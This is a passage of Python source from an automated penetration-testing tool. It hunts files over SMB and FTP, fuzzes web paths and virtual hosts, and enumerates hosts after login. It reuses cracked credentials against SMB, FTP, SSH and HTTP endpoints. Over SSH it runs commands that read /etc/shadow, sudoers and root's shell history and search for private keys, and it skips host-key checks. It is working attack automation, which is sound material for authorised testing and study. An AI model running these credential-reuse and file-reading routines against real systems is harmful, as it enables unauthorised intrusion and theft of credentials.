            "hvf_path":     path,
            "hvf_name":     filename,
            "hvf_category": cat,
            "hvf_label":    HVF_CATEGORIES[cat]["label"],
            "hvf_share":    share,
            "hvf_source":   source,
            "src":          "dc_hvf",
        })

    # ── 1. nmap NSE scan ──────────────────────────────────────────────────
    console.print("[dim]  → Running nmap NSE file-discovery scripts…[/dim]")
    nse_out = _nmap_hvf_scan(target, mode, tmpdir)
    for raw_path in _extract_paths_from_text(nse_out):
        filename = Path(raw_path.replace("\\", "/")).name
        record(raw_path, filename, "nmap-nse")

    # ── 2. SMB share enumeration ──────────────────────────────────────────
    smb_present = any(
        s in nmap_output for s in ["microsoft-ds", "netbios", "445", "139"]
    )
    if smb_present and avail("smbclient"):
        console.print("[dim]  → Enumerating SMB shares…[/dim]")
        shares = _enum_smb_shares(target, tmpdir)

        # Also try with any cracked creds
        auth_pairs: list[tuple[str, str]] = [("", "")]  # null session first
        if cred_hits:
            for c in cred_hits:
                if c.get("service") in ("smb",):
                    auth_pairs.append((c["user"], c["password"]))

        for share in shares:
            console.print(f"[dim]    → Listing share: {share}[/dim]")
            for user, passwd in auth_pairs:
                raw = _smbclient_list(target, share, tmpdir, user, passwd)
                if not raw:
                    continue
                for raw_path in _extract_paths_from_text(raw):
                    filename = Path(raw_path.replace("\\", "/")).name
                    record(raw_path, filename, f"smb:{share}", share=share)
                break  # stop trying creds once we get a listing
    elif smb_present and not avail("smbclient"):
        console.print("[yellow][~] smbclient not found — skipping SMB file listing[/yellow]")

    # ── 3. FTP anonymous listing (if nmap found anon FTP) ────────────────
    if "ftp-anon" in nse_out.lower() and "anonymous" in nse_out.lower():
        console.print("[dim]  → Parsing FTP anonymous listing from NSE output…[/dim]")
        # Paths already extracted from nse_out above; tag source
        for raw_path in _extract_paths_from_text(nse_out):
            filename = Path(raw_path.replace("\\", "/")).name
            record(raw_path, filename, "ftp-anon")

    # ── 4. FTP authenticated listing (cracked credentials — Gap 4) ───────
    # Uses cracked FTP creds from §3 to list the FTP root via curl.
    # _ftp_run_enum() is defined in §8 but resolved at call-time (safe in Python).
    if cred_hits:
        _ftp_creds = [c for c in cred_hits if c.get("service") == "ftp"]
        if _ftp_creds:
            _ftp_ports: list[int] = []
            for _ln in nmap_output.splitlines():
                _pm = re.search(r"(\d+)/tcp\s+open\s+ftp", _ln, re.IGNORECASE)
                if _pm:
                    _ftp_ports.append(int(_pm.group(1)))
            if not _ftp_ports:
                _ftp_ports = [21]
            for _c in _ftp_creds:
                _port = _c.get("port") or _ftp_ports[0]
                console.print(
                    f"[dim]  → FTP listing {_c['user']}@{target}:{_port} "
                    f"(cracked creds)…[/dim]"
                )
                _ftp_data = _ftp_run_enum(target, _port, _c["user"], _c["password"], tmpdir)
                _listing = _ftp_data.get("ftp_listing", "")
                if _listing:
                    for raw_path in _extract_paths_from_text(_listing):
                        filename = Path(raw_path.replace("\\", "/")).name
                        record(raw_path, filename, f"ftp-auth:{_c['user']}")

    console.print(
        f"[{'bold green' if findings else 'dim'}]"
        f"  → {len(findings)} high-value file(s) identified"
        f"[/{'bold green' if findings else 'dim'}]"
    )
    return findings


# ── Rich display ──────────────────────────────────────────────────────────────

def print_hvf_report(hvf_findings: list[dict], target: str):
    if not hvf_findings:
        console.print("[dim][~] No high-value files found.[/dim]")
        return

    # Group by category
    by_cat: dict[str, list[dict]] = {}
    for f in hvf_findings:
        by_cat.setdefault(f["hvf_category"], []).append(f)

    console.print(Panel(
        f"[bold white]TARGET:[/bold white] [cyan]{target}[/cyan]   "
        f"[bold white]HIGH-VALUE FILES FOUND:[/bold white] [red]{len(hvf_findings)}[/red]",
        title="[bold red]◈ HIGH-VALUE FILE HUNT ◈[/bold red]",
        border_style="red",
    ))

    for cat_key, items in by_cat.items():
        cat   = HVF_CATEGORIES[cat_key]
        color = cat["color"]
        t = Table(
            title=f"[{color}]{cat['label']}  ({len(items)} file(s))[/{color}]",
            box=box.SIMPLE_HEAD, show_lines=True, expand=True,
        )
        t.add_column("Filename",  width=30)
        t.add_column("Full Path", ratio=2)
        t.add_column("Share",     width=16)
        t.add_column("Source",    width=14)
        for item in items:
            t.add_row(
                f"[{color}]{item['hvf_name']}[/{color}]",
                item["hvf_path"],
                item.get("hvf_share", "—"),
                f"[dim]{item['hvf_source']}[/dim]",
            )
        console.print(t)


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 7 — WEB FUZZING  (gobuster / ffuf / feroxbuster)
# ══════════════════════════════════════════════════════════════════════════════
#
# Directory and virtual-host brute-forcing against all detected HTTP/HTTPS ports.
#   _BUILTIN_WORDLIST        — compact built-in path list (no external file required)
#   _VHOST_PREFIXES          — common subdomain prefixes for vhost fuzzing
#   FUZZ_TOOL_PREFERENCE     — priority order: feroxbuster > ffuf > gobuster
#   _pick_fuzzer()           — selects the first available fuzzer from the list
#   _write_builtin_wordlist() — writes built-in list to <sdir>/ if no external list given
#   _fuzz_dirs()             — runs chosen fuzzer for directory/path discovery
#   _fuzz_vhosts()           — enumerates virtual hosts via Host-header fuzzing
#   _parse_fuzz_output()     — normalises all three tool formats into finding dicts
#   run_web_fuzz()           — detects HTTP ports from nmap, runs dir + vhost fuzz
#                              Each finding includes fuzz_status (200/301/401/403)
#
# Takes input from: nmap_output (HTTP port detection)
# Feeds into: main findings list (src="dc_fuzz"), live_adapt trigger "juicy web→webfuzz"
#             Gap 5: fuzz_findings 401/403 entries passed to §8 postauth for cred probing

# Built-in compact wordlist for when no external list is available
_BUILTIN_WORDLIST = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php", "phpmyadmin",
    "dashboard", "portal", "api", "api/v1", "api/v2", "rest", "graphql",
    "backup", "backups", "bak", "old", "temp", "tmp", "test", "dev", "stage",
    "config", "configuration", "setup", "install", "upgrade", "update",
    "uploads", "upload", "files", "file", "static", "assets", "media",
    "images", "img", "css", "js", "scripts", "include", "includes",
    "console", "manager", "management", "control", "panel", "cp",
    ".git", ".env", ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml",
    "server-status", "server-info", "web.config", "crossdomain.xml",
    "phpinfo.php", "info.php", "test.php", "shell.php", "cmd.php",
    "user", "users", "account", "accounts", "profile", "register",
    "forgot", "reset", "logout", "auth", "oauth", "sso", "saml",
    "swagger", "swagger-ui", "openapi", "docs", "doc", "help",
    "health", "healthz", "metrics", "status", "ping", "version",
    "debug", "trace", "logs", "log", "error", "errors",
    "database", "db", "sql", "mysql", "postgres", "mongo",
    "jenkins", "jira", "confluence", "gitlab", "github", "bitbucket",
    "sonar", "nexus", "artifactory", "kibana", "grafana", "prometheus",
    "actuator", "actuator/env", "actuator/health", "actuator/mappings",
    "cgi-bin", "cgi", "bin", "exec", "execute", "run", "cmd", "command",
]

# Common vhost wordlist suffixes to try
_VHOST_PREFIXES = [
    "dev", "staging", "stage", "test", "api", "admin", "portal", "app",
    "mail", "webmail", "ftp", "vpn", "remote", "internal", "intranet",
    "jenkins", "git", "gitlab", "monitor", "dash", "dashboard", "beta",
    "demo", "old", "backup", "secure", "login", "auth", "sso",
]

FUZZ_TOOL_PREFERENCE = ["feroxbuster", "ffuf", "gobuster"]


def _pick_fuzzer() -> str | None:
    for tool in FUZZ_TOOL_PREFERENCE:
        if avail(tool):
            return tool
    return None


def _write_builtin_wordlist(sdir: str) -> str:
    path = phase_out(sdir, "builtin_wordlist.txt")
    if not os.path.exists(path):
        Path(path).write_text("\n".join(_BUILTIN_WORDLIST))
    return path


def _fuzz_dirs(target: str, port: int, mode: int, sdir: str,
               wordlist: str, tool: str) -> list[dict]:
    """Run directory fuzzing and return list of discovered path dicts."""
    scheme   = "https" if str(port) in ("443", "8443", "4443") else "http"
    base_url = f"{scheme}://{target}:{port}"
    out      = phase_out(sdir, f"fuzz_dir_{port}.txt")

    # Mode → threads / rate
    threads = {1: "5", 2: "10", 3: "30", 4: "50"}[mode]

    if tool == "feroxbuster":
        args = [
            "feroxbuster", "--url", base_url,
            "--wordlist", wordlist,
            "--threads", threads,
            "--depth", "2",
            "--no-state",
            "--quiet",
            "--output", out,
        ]
        if scheme == "https":
            args += ["--insecure"]
    elif tool == "ffuf":
        args = [
            "ffuf", "-u", f"{base_url}/FUZZ",
            "-w", wordlist,
            "-t", threads,
            "-mc", "200,201,204,301,302,307,401,403",
            "-o", out, "-of", "csv",
            "-s",
        ]
        if scheme == "https":
            args += ["-k"]
    else:  # gobuster
        args = [
            "gobuster", "dir",
            "-u", base_url,
            "-w", wordlist,
            "-t", threads,
            "-q",
            "-o", out,
        ]
        if scheme == "https":
            args += ["-k"]

    run_cmd(args, out, timeout=600, tool_label=tool)
    return _parse_fuzz_output(out, tool, base_url)


def _fuzz_vhosts(target: str, port: int, mode: int, sdir: str,
                 domain: str, tool: str) -> list[dict]:
    """Enumerate virtual hosts using a generated prefix list."""
    scheme   = "https" if str(port) in ("443", "8443", "4443") else "http"
    base_url = f"{scheme}://{target}:{port}"
    out      = phase_out(sdir, f"fuzz_vhost_{port}.txt")

    vhost_list = phase_out(sdir, "vhost_list.txt")
    entries = [f"{pfx}.{domain}" for pfx in _VHOST_PREFIXES] + _VHOST_PREFIXES
    Path(vhost_list).write_text("\n".join(entries))

    threads = {1: "5", 2: "10", 3: "20", 4: "40"}[mode]

    if tool == "ffuf":
        args = [
            "ffuf", "-u", base_url,
            "-H", "Host: FUZZ",
            "-w", vhost_list,
            "-t", threads,
            "-mc", "200,201,204,301,302,307,401,403",
            "-o", out, "-of", "csv",
            "-s",
        ]
        if scheme == "https":
            args += ["-k"]
    elif tool == "gobuster":
        args = [
            "gobuster", "vhost",
            "-u", base_url,
            "-w", vhost_list,
            "-t", threads,
            "-q",
        ]
    else:
        return []   # feroxbuster doesn't do vhost fuzzing

    run_cmd(args, out, timeout=300, tool_label=tool)
    return _parse_fuzz_output(out, tool, base_url, vhost_mode=True)


def _parse_fuzz_output(path: str, tool: str, base_url: str,
                       vhost_mode: bool = False) -> list[dict]:
    """Parse fuzzer output into finding dicts."""
    results = []
    if not os.path.exists(path):
        return results
    text = read_file(path)

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        if tool == "feroxbuster":
            # format: STATUS SIZE WORDS LINES URL
            m = re.match(r"(\d{3})\s+\d+\w*\s+\d+\w*\s+\d+\w*\s+(https?://\S+)", line)
            if m:
                results.append({
                    "fuzz_url":    m.group(2),
                    "fuzz_status": m.group(1),
                    "fuzz_type":   "vhost" if vhost_mode else "dir",
                    "src":         "dc_fuzz",
                })
        elif tool == "ffuf":
            # CSV: FUZZ,url,redirectlocation,position,status_code,content_length,...
            parts = line.split(",")
            if len(parts) >= 5 and parts[4].isdigit():
                results.append({
                    "fuzz_url":    parts[1] if not vhost_mode else f"Host: {parts[0]}",
                    "fuzz_status": parts[4],
                    "fuzz_type":   "vhost" if vhost_mode else "dir",
                    "src":         "dc_fuzz",
                })
        else:  # gobuster
            m = re.match(r"(/.+?)\s+\(Status:\s*(\d+)\)", line)
            if m:
                results.append({
                    "fuzz_url":    base_url + m.group(1),
                    "fuzz_status": m.group(2),
                    "fuzz_type":   "vhost" if vhost_mode else "dir",
                    "src":         "dc_fuzz",
                })
    return results


def run_web_fuzz(
    target: str, mode: int, sdir: str, nmap_output: str,
    wordlist: str | None = None,
) -> list[dict]:
    """Fuzz all detected HTTP/HTTPS ports for directories and virtual hosts."""
    tool = _pick_fuzzer()
    if not tool:
        console.print(
            "[yellow][~] No web fuzzer found (gobuster/ffuf/feroxbuster) — "
            "skipping web fuzz[/yellow]"
        )
        return []

    # Detect HTTP ports
    http_ports: list[tuple[int, str]] = []
    for line in nmap_output.splitlines():
        m = re.search(r"(\d+)/tcp\s+open\s+(\S+)", line)
        if m:
            port, svc = int(m.group(1)), m.group(2).lower()
            if any(kw in svc for kw in ["http", "https", "nginx", "apache", "iis", "web"]):
                http_ports.append((port, svc))
    for std in (80, 443, 8080, 8443, 8000, 8888):
        if not any(p == std for p, _ in http_ports) and f"{std}/tcp" in nmap_output:
            http_ports.append((std, "http"))

    if not http_ports:
        console.print("[dim][~] No HTTP ports detected — skipping web fuzz[/dim]")
        return []

    wl = wordlist or _write_builtin_wordlist(sdir)
    console.print(
        f"\n[bold cyan][+] Web fuzzing with {tool} on {len(http_ports)} port(s)…[/bold cyan]"
    )

    all_results: list[dict] = []
    for port, _ in http_ports:
        console.print(f"[dim]  → dir fuzz port {port}…[/dim]")
        hits = _fuzz_dirs(target, port, mode, sdir, wl, tool)
        console.print(f"[dim]    {len(hits)} path(s) found[/dim]")
        all_results.extend(hits)

        # vhost fuzz only if target looks like a domain
        if not re.match(r"^\d+\.\d+\.\d+\.\d+$", target) and tool in ("ffuf", "gobuster"):
            console.print(f"[dim]  → vhost fuzz port {port}…[/dim]")
            vhosts = _fuzz_vhosts(target, port, mode, sdir, target, tool)
            console.print(f"[dim]    {len(vhosts)} vhost(s) found[/dim]")
            all_results.extend(vhosts)

    # Print summary table
    if all_results:
        t = Table(
            title=f"[bold red]WEB FUZZ RESULTS — {len(all_results)} hit(s)[/bold red]",
            box=box.SIMPLE_HEAD, show_lines=True, expand=True,
        )
        t.add_column("Status", width=7)
        t.add_column("Type",   width=8)
        t.add_column("URL / Host",  ratio=1)
        for r in sorted(all_results, key=lambda x: x["fuzz_status"]):
            status_color = (
                "green"  if r["fuzz_status"].startswith("2") else
                "yellow" if r["fuzz_status"].startswith("3") else
                "red"    if r["fuzz_status"].startswith("4") else "white"
            )
            t.add_row(
                f"[{status_color}]{r['fuzz_status']}[/{status_color}]",
                r["fuzz_type"],
                r["fuzz_url"],
            )
        console.print(t)
    else:
        console.print("[dim][~] No interesting paths found by fuzzer[/dim]")

    return all_results


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 8 — POST-AUTH ENUMERATION  (SSH / FTP shell enum after cred success)
# ══════════════════════════════════════════════════════════════════════════════
#
# Non-destructive enumeration run after credentials are confirmed.
#   SSH_ENUM_COMMANDS        — ordered list of (command, label) pairs; read-only only
#   _ssh_run_commands()      — opens SSH session, runs enum commands, returns output dict
#   _ftp_run_enum()          — lists FTP root directory using curl (or ftp binary)
#   _probe_restricted_urls() — Gap 5: tries cracked HTTP creds against 401/403 URLs
#                              found by §7 webfuzz; surfaces newly-accessible endpoints
#   _display_posture()       — rich panel + tables for identity/sudo/SUID/shadow findings
#   run_post_auth_enum()     — iterates SSH creds, FTP creds, and restricted HTTP URLs
#                              Surfaces critical flags as discrete top-level findings:
#                              shadow readable, sudo ALL/NOPASSWD, SUID binaries
#
# Takes input from: cred_results (§3), restricted_urls = 401/403 from fuzz_findings (§7)
# Feeds into: main findings list (src="dc_postauth"), live_adapt trigger "creds→postauth"

# Commands run over SSH after successful login — non-destructive enumeration only
SSH_ENUM_COMMANDS = [
    ("id",                      "identity"),
    ("whoami",                  "identity"),
    ("uname -a",                "kernel"),
    ("cat /etc/os-release",     "os_release"),
    ("hostname",                "hostname"),
    ("ip addr show",            "network"),
    ("cat /etc/passwd",         "users"),
    ("cat /etc/shadow",         "shadow"),
    ("sudo -l",                 "sudo_privs"),
    ("find / -perm -4000 -type f 2>/dev/null", "suid_bins"),
    ("find / -perm -2000 -type f 2>/dev/null", "sgid_bins"),
    ("crontab -l 2>/dev/null",  "crontab_user"),
    ("cat /etc/crontab 2>/dev/null", "crontab_sys"),
    ("ls -la /etc/cron*",       "cron_dirs"),
    ("find / -writable -type f -not -path '/proc/*' 2>/dev/null | head -20",
                                "writable_files"),
    ("cat /etc/sudoers 2>/dev/null", "sudoers"),
    ("env",                     "environment"),
    ("ps aux",                  "processes"),
    ("netstat -tulnp 2>/dev/null || ss -tulnp", "listening_ports"),
    ("cat /root/.bash_history 2>/dev/null", "root_history"),
    ("cat ~/.bash_history 2>/dev/null",     "user_history"),
    ("find /home -name '*.txt' -o -name '*.key' -o -name '*.pem' 2>/dev/null | head -20",
                                "home_juicy_files"),
    ("cat /var/mail/* 2>/dev/null | head -50", "mail"),
    ("last",                    "last_logins"),
    ("dpkg -l 2>/dev/null || rpm -qa 2>/dev/null | head -30", "installed_pkgs"),
    ("getcap -r / 2>/dev/null | head -20", "capabilities"),
]


def _ssh_run_commands(host: str, port: int, user: str, password: str,
                      sdir: str) -> dict[str, str]:
    """
    Run SSH enumeration commands via ssh subprocess with sshpass.
    Falls back to paramiko-style if sshpass unavailable.
    Returns dict of {label: output}.
    """
    results: dict[str, str] = {}

    if not avail("ssh"):
        console.print("[yellow][~] ssh client not found — skipping post-auth enum[/yellow]")
        return results

    ssh_opts = [
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        "-o", "BatchMode=no",
        "-p", str(port),
    ]

    # Build full command string — run all commands in one connection.
    # The separator is stored in a shell variable (_S) so it does NOT appear
    # literally in the command string. This prevents ps aux from showing the
    # separator text in the process list, which would break output splitting.
    _SEP = "---DC_SEP---"
    cmd_chain = (
        f"_S='{_SEP}' ; "
        + " ; echo \"$_S\" ; ".join(cmd for cmd, _ in SSH_ENUM_COMMANDS)
    )
    labels = [label for _, label in SSH_ENUM_COMMANDS]

    use_sshpass = avail("sshpass")
    ssh_env = None
    _askpass_path: str | None = None

    if use_sshpass:
        # Pass password via SSHPASS env var (-e flag) to avoid process list exposure
        ssh_env = {**os.environ, "SSHPASS": password}
        ssh_cmd = (
            ["sshpass", "-e", "ssh"]
            + ssh_opts
            + [f"{user}@{host}", cmd_chain]
        )
    else:
        # SSH_ASKPASS: write a temp script that echoes the password.
        # SSH uses it when DISPLAY is set and there is no controlling TTY
        # (which is always the case under subprocess.run with capture_output).
        console.print("[dim][~] sshpass not found — using SSH_ASKPASS[/dim]")
        _askpass_fd, _askpass_path = tempfile.mkstemp(suffix=".sh")
        try:
            os.chmod(_askpass_path, 0o700)
            escaped = password.replace("'", "'\\''")
            with os.fdopen(_askpass_fd, "w") as _af:
                _af.write(f"#!/bin/sh\necho '{escaped}'\n")
        except Exception:
            if _askpass_path and os.path.exists(_askpass_path):
                os.unlink(_askpass_path)
            _askpass_path = None
        ssh_env = {
            **os.environ,
            "SSH_ASKPASS": _askpass_path or "",
            "SSH_ASKPASS_REQUIRE": "force",   # OpenSSH ≥ 8.4
            "DISPLAY": os.environ.get("DISPLAY", ":0"),
        }
        ssh_cmd = ["ssh"] + ssh_opts + [f"{user}@{host}", cmd_chain]

    try:
        r = subprocess.run(
            ssh_cmd, capture_output=True, text=True, timeout=120,
            env=ssh_env,
        )
        raw = r.stdout or ""
        chunks = raw.split("---DC_SEP---")
        for i, (label, chunk) in enumerate(zip(labels, chunks)):
            out = chunk.strip()
            if out:
                results[label] = out
    except subprocess.TimeoutExpired:
        console.print(f"[yellow][!] SSH enum timed out on {host}:{port}[/yellow]")
    except Exception as e:
        console.print(f"[yellow][~] SSH enum error: {e}[/yellow]")
    finally:
        if _askpass_path and os.path.exists(_askpass_path):
            try:
                os.unlink(_askpass_path)
            except OSError:
                pass

    return results


def _ftp_run_enum(host: str, port: int, user: str, password: str,
                  sdir: str) -> dict[str, str]:
    """List FTP root and download any high-value file names found."""
    results: dict[str, str] = {}
    if not avail("ftp") and not avail("curl"):
        return results

    out = phase_out(sdir, f"ftp_enum_{port}.txt")
    if avail("curl"):
        # Write credentials to a temp .netrc file (0o600) to avoid process list exposure
        netrc_fd, netrc_path = tempfile.mkstemp(suffix=".netrc")
        try:
            os.chmod(netrc_path, 0o600)
            with os.fdopen(netrc_fd, "w") as nf:
                nf.write(f"machine {host}\nlogin {user}\npassword {password}\n")
            r = subprocess.run(
                ["curl", "--netrc-file", netrc_path,
                 f"ftp://{host}:{port}/", "--list-only", "-s", "--connect-timeout", "10"],
                capture_output=True, text=True, timeout=30,
            )
            results["ftp_listing"] = r.stdout.strip()
            Path(out).write_text(r.stdout)
        except Exception as e:
            console.print(f"[yellow][~] FTP enum error: {e}[/yellow]")
        finally:
            try:
                os.unlink(netrc_path)
            except OSError:
                pass
    return results


def _display_posture(host: str, user: str, enum_data: dict[str, str]):
    """Print a rich panel summarising post-auth findings."""
    if not enum_data:
        return

    highlights: list[str] = []

    if "identity" in enum_data:
        highlights.append(f"[bold]Identity:[/bold] {enum_data['identity'][:120]}")
    if "kernel" in enum_data:
        highlights.append(f"[bold]Kernel:[/bold] {enum_data['kernel'][:80]}")
    if "sudo_privs" in enum_data:
        sudol = enum_data["sudo_privs"]
        if "all" in sudol.lower() or "nopasswd" in sudol.lower():
            highlights.append(f"[bold red]⚠ SUDO:[/bold red] {sudol[:200]}")
        else:
            highlights.append(f"[bold]Sudo:[/bold] {sudol[:120]}")
    if "suid_bins" in enum_data and enum_data["suid_bins"]:
        count = len(enum_data["suid_bins"].splitlines())
        highlights.append(f"[bold red]⚠ SUID binaries:[/bold red] {count} found")
    if "shadow" in enum_data and enum_data["shadow"]:
        highlights.append("[bold red]⚠ /etc/shadow READABLE[/bold red]")
    if "writable_files" in enum_data and enum_data["writable_files"]:
        count = len(enum_data["writable_files"].splitlines())
        highlights.append(f"[bold yellow]⚠ Writable files:[/bold yellow] {count} found")
    if "listening_ports" in enum_data:
        highlights.append(f"[bold]Internal ports:[/bold] (see full data)")

    console.print(Panel(
        "\n".join(highlights) or "No notable findings.",
        title=f"[bold red]◈ POST-AUTH POSTURE: {user}@{host} ◈[/bold red]",
        border_style="red",
    ))

    # Full dump table for key sections
    interesting = {
        "users":         "Local Users",
        "suid_bins":     "SUID Binaries",
        "crontab_sys":   "System Crontab",
        "home_juicy_files": "Juicy Home Files",
        "installed_pkgs": "Installed Packages (sample)",
    }
    for key, label in interesting.items():
        if key in enum_data and enum_data[key]:
            t = Table(title=f"[cyan]{label}[/cyan]", box=box.SIMPLE_HEAD, expand=True)
            t.add_column("Output")
            for line in enum_data[key].splitlines()[:30]:
                t.add_row(line)
            console.print(t)


def _probe_restricted_urls(
    restricted_urls: list[str], cred_results: list[dict]
) -> list[dict]:
    """
    Gap 5: probe 401/403 URLs discovered by §7 webfuzz using cracked HTTP credentials.
    Tries HTTP basic-auth for each URL × each http/https cred pair.
    Returns finding dicts for any URL that responds with a non-401/403 status.
    """
    http_creds = [c for c in cred_results if c.get("service") in ("http", "https")]
    if not http_creds or not restricted_urls:
        return []

    results: list[dict] = []
    for url in restricted_urls:
        for c in http_creds:
            try:
                r = requests.get(
                    url, auth=(c["user"], c["password"]),
                    timeout=6, verify=False, allow_redirects=True,
                )
                if r.status_code not in (401, 403):
                    console.print(
                        f"    [bold green]✓  HTTP auth bypass "
                        f"{c['user']}:{c['password']} → {url} "
                        f"(HTTP {r.status_code})[/bold green]"
                    )
                    results.append({
                        "src":         "dc_postauth",
                        "issue":       "authenticated HTTP endpoint",
                        "url":         url,
                        "user":        c["user"],
                        "password":    c["password"],
                        "http_status": r.status_code,
                        "evidence":    f"basic-auth HTTP {r.status_code} at {url}",
                    })
                    break   # stop trying creds once one works for this URL
            except Exception:
                pass
    return results


def _extract_postauth_findings(postauth_findings: list[dict]) -> list[dict]:
    """
    Derive normalized secondary findings from post_auth_data content.

    Bridges the rich SSH enum output (sudo rules, SUID bins, kernel version,
    running processes, network interfaces, user accounts, etc.) into
    trigger-matchable finding dicts for the wan_si_tong collator.

    Called after postauth completes — both fresh runs and cached resumes —
    so the live_adapt step and any subsequent WST re-scoring sees this data.
    """
    import re as _re
    derived: list[dict] = []
    _src = "dc_postauth_derived"

    for f in postauth_findings:
        pad = f.get("post_auth_data", {})
        if not isinstance(pad, dict):
            continue

        # ── Sudo ──────────────────────────────────────────────────────────────
        sudo = pad.get("sudo_privs", "")
        if sudo and any(s in sudo for s in (
            "NOPASSWD: ALL", "(ALL : ALL) ALL", "(ALL:ALL) NOPASSWD", "(ALL) ALL"
        )):
            derived.append({"issue": "sudo_nopasswd", "src": _src,
                             "evidence": sudo[:200]})

        # ── SUID binaries ─────────────────────────────────────────────────────
        suid = pad.get("suid_bins", "")
        if suid:
            derived.append({"issue": "suid_bins_present", "src": _src})
            if "pkexec" in suid:
                derived.append({"issue": "suid_pkexec", "src": _src})

        # ── Shadow readable ───────────────────────────────────────────────────
        # Shadow content always starts with a hash ($6$, $y$, etc.)
        shadow = pad.get("shadow", "")
        if shadow and "$" in shadow:
            derived.append({"issue": "shadow_readable",
                             "post_auth_data": {"shadow_readable": True},
                             "src": _src})

        # ── Linux capabilities ────────────────────────────────────────────────
        caps = pad.get("capabilities", "")
        if caps and "cap_" in caps.lower():
            derived.append({"issue": "capabilities_found",
                             "post_auth_data": {"capabilities": caps[:500]},
                             "src": _src})

        # ── Kernel version ────────────────────────────────────────────────────
        kernel = pad.get("kernel", "")
        if kernel:
            m = _re.search(r"(\d+)\.(\d+)\.(\d+)", kernel)
            if m:
                kver = f"{m.group(1)}.{m.group(2)}.{m.group(3)}"
                derived.append({"kernel_version": kver, "src": _src})
                if int(m.group(1)) < 4:
                    derived.append({"issue": "kernel_old",
                                    "kernel_version": kver, "src": _src})

        # ── Processes ─────────────────────────────────────────────────────────
        procs = pad.get("processes", "").lower()
        if procs:
            if "dockerd" in procs or "docker-containerd" in procs:
                derived.append({"service": "docker", "issue": "docker_running",
                                 "src": _src})
            for _ircd in ("unrealircd", "ircd\n", "ngircd", "inspircd"):
                if _ircd in procs:
                    derived.append({"service": "unrealircd", "src": _src})
                    break
            if "knockd" in procs:
                derived.append({"issue": "port_knocking", "src": _src})

        # ── Group membership → container escalation path ──────────────────────
        identity = pad.get("identity", "").lower()
        if "docker" in identity or "lxd" in identity or "lxc" in identity:
            derived.append({"issue": "container_group",
                             "post_auth_data": {"lxd": "container_group"},
                             "src": _src})

        # ── Writable systemd service files ────────────────────────────────────
        writable = pad.get("writable_files", "")
        if writable:
            if writable.strip():
                derived.append({"issue": "writable_files_found", "src": _src})
            if "systemd" in writable or "/lib/systemd" in writable:
                derived.append({"post_auth_data": {"systemd": True}, "src": _src})

        # ── Network interfaces (multi-homed) ──────────────────────────────────
        network = pad.get("network", "")
        if network:
            ifaces = [l for l in network.splitlines()
                      if "inet " in l and "127." not in l]
            if len(ifaces) > 1:
                derived.append({"issue": "multi_homed",
                                 "interface_count": len(ifaces), "src": _src})

        # ── User accounts from /etc/passwd ────────────────────────────────────
        users_raw = pad.get("users", "")
        if users_raw:
            for line in users_raw.splitlines():
                parts = line.split(":")
                if len(parts) >= 4:
                    try:
                        uid = int(parts[2])
                        uname = parts[0]
                        if uid >= 1000 and uname not in ("nobody", "nfsnobody"):
                            derived.append({"user": uname, "uid": uid, "src": _src})
                    except ValueError:
                        pass

    return derived


def run_post_auth_enum(
    target: str, cred_results: list[dict], sdir: str,
    restricted_urls: list[str] | None = None,
) -> list[dict]:
    """
    For every cracked SSH or FTP credential, open a session and run
    non-destructive enumeration. Returns list of finding dicts.

    Gap 5: if restricted_urls is provided (401/403 paths from §7 webfuzz),
    also probes those URLs with any cracked HTTP credentials.
    """
    findings: list[dict] = []

    ssh_creds = [c for c in cred_results if c.get("service") == "ssh"]
    ftp_creds = [c for c in cred_results if c.get("service") == "ftp"]

    if not ssh_creds and not ftp_creds:
        console.print("[dim][~] No SSH/FTP credentials — skipping post-auth enum[/dim]")
        return findings

    console.print("\n[bold cyan][+] Post-auth enumeration…[/bold cyan]")

    # SSH
    seen_ssh: set[tuple] = set()
    for c in ssh_creds:
        key = (c["user"], c["port"])
        if key in seen_ssh:
            continue
        seen_ssh.add(key)
        console.print(
            f"[dim]  → SSH {c['user']}@{target}:{c['port']}…[/dim]"
        )
        enum_data = _ssh_run_commands(target, c["port"], c["user"], c["password"], sdir)
        if enum_data:
            _display_posture(target, c["user"], enum_data)
            findings.append({
                "post_auth_host":    target,
                "post_auth_user":    c["user"],
                "post_auth_service": "ssh",
                "post_auth_port":    c["port"],
                "post_auth_data":    enum_data,
                "src":               "dc_postauth",
            })
            # Surface critical flags as top-level findings too
            if "shadow" in enum_data and enum_data["shadow"]:
                findings.append({
                    "issue":    "shadow file readable",
                    "evidence": f"ssh {c['user']}@{target}:{c['port']}",
                    "src":      "dc_postauth",
                })
            if "sudo_privs" in enum_data:
                s = enum_data["sudo_privs"].lower()
                if "all" in s or "nopasswd" in s:
                    findings.append({
                        "issue":    "sudo ALL or NOPASSWD",
                        "evidence": enum_data["sudo_privs"][:200],
                        "src":      "dc_postauth",
                    })
            if "suid_bins" in enum_data and enum_data["suid_bins"]:
                findings.append({
                    "issue":    "SUID binaries found",
                    "evidence": enum_data["suid_bins"][:500],
                    "src":      "dc_postauth",
                })

    # FTP
    for c in ftp_creds:
        console.print(f"[dim]  → FTP {c['user']}@{target}:{c['port']}…[/dim]")
        enum_data = _ftp_run_enum(target, c["port"], c["user"], c["password"], sdir)
        if enum_data:
            findings.append({
                "post_auth_host":    target,
                "post_auth_user":    c["user"],
                "post_auth_service": "ftp",
                "post_auth_port":    c["port"],
                "post_auth_data":    enum_data,
                "src":               "dc_postauth",
            })

    # Gap 5: probe 401/403 URLs discovered by §7 webfuzz with HTTP creds
    if restricted_urls:
        console.print("[dim]  → Probing restricted URLs with cracked HTTP creds…[/dim]")
        findings.extend(_probe_restricted_urls(restricted_urls, cred_results))

    console.print(
        f"[{'bold green' if findings else 'dim'}]"
        f"  → {len(findings)} post-auth finding(s)"
        f"[/{'bold green' if findings else 'dim'}]"
    )
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 9 — VULNERABILITY PROBE  (nmap --script vuln confirmation)
# ══════════════════════════════════════════════════════════════════════════════
#
# Confirms exploitability of candidate vulnerabilities using nmap NSE vuln scripts.
#   SERVICE_VULN_SCRIPTS     — per-service NSE script sets (http-vuln*, smb-vuln*, etc.)
#   GENERAL_VULN_SCRIPTS     — ["vuln", "exploit"] run against all services unconditionally
#   run_vuln_probe()         — detects services from findings, runs targeted + general
#                              NSE scripts, returns structured probe findings
